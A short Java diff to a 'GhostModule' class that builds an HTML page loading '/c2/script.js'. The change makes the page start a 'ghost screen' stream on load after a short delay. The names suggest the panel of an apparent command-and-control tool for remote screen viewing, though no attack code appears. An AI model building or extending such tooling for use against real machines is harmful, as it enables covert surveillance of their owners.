@@ -757,7 +757,7 @@ public class GhostModule extends BaseModule {
         html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px;\">CONNECTED</div>");
         html.append("</div></div>");
         html.append("<script src=\"/c2/script.js\"></script>");
-        html.append("<script>window.addEventListener('load', () => { if (typeof toggleGhostStream === 'function') toggleGhostStream(); });</script>");
+        html.append("<script>window.addEventListener('load', () => { setTimeout(() => { if (typeof startGhostScreen === 'function') startGhostScreen(); }, 500); });</script>");
         html.append("</div></body></html>");
         return newResponse(Response.Status.OK, "text/html", html.toString());
     }
